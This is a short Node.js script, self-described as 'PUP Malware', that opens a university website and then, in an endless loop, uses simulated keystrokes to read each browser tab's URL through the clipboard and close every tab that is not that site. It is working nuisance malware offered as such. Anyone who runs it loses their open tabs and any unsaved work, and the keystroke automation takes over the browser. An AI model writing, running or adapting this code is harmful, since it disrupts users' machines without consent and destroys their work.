const activeWindow = require("active-win");
const { exec } = require("child_process");
const robot = require("robotjs");
const { execSync } = require("child_process");

const PUPlink = "https://www.pup.edu.ph/#virus";
const START_DELAY = 60; // In seconds

async function openPUPTab() {
  await new Promise(async (resolve) => {
    exec(`start ${PUPlink}`);

    // Add delay to let chrome open first
    await delay(1);
    resolve();
  });
}

async function startMalware() {
  console.log("PUP Malware by Mark Kenneth Calendario.");
  console.log(
    `PUP website opened. Malware will start in ${START_DELAY} seconds.`
  );

  await openPUPTab();

  await delay(START_DELAY);
  robot.keyTap("tab", ["control"]);

  while (true) {
    await delay(0.5);

    if (!(await isWindowBrowser())) {
      console.log("Skipping... Current window is not a browser.");
      continue;
    }

    robot.keyTap("l", ["control"]);
    robot.keyTap("c", ["control"]);

    let currentUrl = await getClipboard();
    console.log(currentUrl, PUPlink);
    if (currentUrl === PUPlink) {
      robot.keyTap("tab", ["control"]);
      continue;
    }

    robot.keyTap("w", ["control"]);
  }
}

async function isWindowBrowser() {
  const browsers = ["Google Chrome", "Mozilla Firefox", "Microsoft Edge"];
  return browsers.includes((await activeWindow())?.owner?.name);
}

async function delay(seconds) {
  await new Promise((resolve) => {
    setTimeout(resolve, seconds * 1000);
  });
}

async function getClipboard() {
  const retrieveCommand =
    process.platform === "win32" ? "powershell Get-Clipboard" : "pbpaste";
  return execSync(retrieveCommand, { encoding: "utf-8" }).trim();
}

startMalware();
